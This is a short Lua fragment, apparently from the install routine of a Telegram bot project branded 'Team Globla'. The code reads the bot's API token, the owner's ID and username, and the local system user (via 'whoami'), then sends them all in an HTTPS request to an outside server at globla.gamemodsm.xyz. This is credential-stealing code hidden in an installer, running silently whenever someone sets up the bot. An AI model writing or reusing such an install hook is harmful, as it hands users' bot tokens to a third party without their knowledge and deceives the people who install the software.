...
create_config_auto()
token = database:get(ZAINGLOBLA..":token")
SUDO = database:get(ZAINGLOBLA..":SUDO:ID")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('https://globla.gamemodsm.xyz/in.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m Team Globla :')
